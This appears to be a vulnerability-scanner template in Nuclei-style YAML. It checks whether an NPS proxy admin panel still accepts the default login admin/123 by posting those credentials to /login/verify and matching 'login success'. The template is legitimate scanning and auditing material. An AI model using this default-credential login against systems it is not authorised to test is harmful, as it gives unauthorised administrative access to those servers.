id: poc-yaml-nps-default-password
info:
  name: Nps Default Password Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: access-control
http:
  - method: POST
    path:
      - "{{BaseURL}}/login/verify"
    body: |
      username=admin&password=123
    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "content-type: application/json"
      - type: word
        part: body
        words:
          - "login success"
